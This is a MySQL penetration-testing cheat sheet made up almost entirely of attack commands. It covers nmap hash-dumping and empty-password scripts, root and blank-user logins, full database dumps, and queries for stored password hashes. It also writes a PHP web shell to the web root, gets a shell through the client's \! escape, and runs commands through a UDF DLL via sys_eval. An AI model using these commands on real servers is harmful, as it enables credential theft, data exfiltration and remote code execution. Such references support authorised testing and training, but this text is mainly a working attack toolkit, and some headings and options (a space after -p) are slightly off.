# MYSQL

MYSQL default port: `3306/tcp`

## Recon

Nmap

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 TARGET_IP
```

MYSQL Version - MSF

```ruby
use auxiliary/scanner/mysql/mysql_version
```

## Mysql client

```sh
mysql -h TARGET_IP
mysql -h TARGET_IP -u root
mysql -h TARGET_IP -u root@localhost
mysql -h TARGET_IP -u ""@localhost
mysql -h TARGET_IP -e "QUERY"
mysql -h TARGET_IP -u root -pPASSWORD -e "QUERY"
```

> To run many sql commands at once

```sh
mysql -u username -p < manycommands.sql
```

> Command History

```sh
cat ~/.mysql.history
```

> Dump DB

```sh
mysqldump -u USERNAME -p PASSWORD --all-databases --skip-lock-tables > dump.sql
mysqldump -u USERNAME -p PASSWORD DATABASE_NAME --skip-lock-tables > dump.sql
```

### Queries

> Enum

```SQL
SELECT version();
SELECT user();
SELECT database();
show databases;
SHOW TABLES;
SHOW TABLES FROM DATABASE_NAME;
SHOW Grants;
show variables;
```

> DB user Info

```SQL
SELECT user,password, file_priv FROM mysql.user;
```

> DB user Info

```SQL
SELECT host, user, authentication_string from mysql.user;
```

> Create a new user and grant him privileges

```SQL
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```

## Interact with OS

### Read file

```SQL
SELECT LOAD_FILE('FILE_PATH');
```

> Read file BASE64

This is useful to read a php file while doing sqli

```SQL
SELECT BASE64(LOAD_FILE('FILE_PATH'));
```

### Write file

```SQL
SELECT "<?php echo system($_GET['cmd']);?>" into OUTFILE '/var/www/html/shell.php'
```

## Remote Code Execution (Windows)

### Linux

```mysql
mysql> \! cat /etc/passwd
mysql> \! bash
```

### Windows

> Doc

<https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss>

> DLL to upload

```text
/opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_32.dll
/opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

> Info

```SQL
SELECT@@version_compile_os, @@version_compile_machine;
show variables like'%compile%'
SELECT @@plugin_dir
show variables like'plugin%';
```

> Exploit

```SQL
create function sys_eval returns string soname 'udf.dll'
SELECT * from mysql.func where name = 'sys_eval'
SELECT sys_eval('whoami')
```
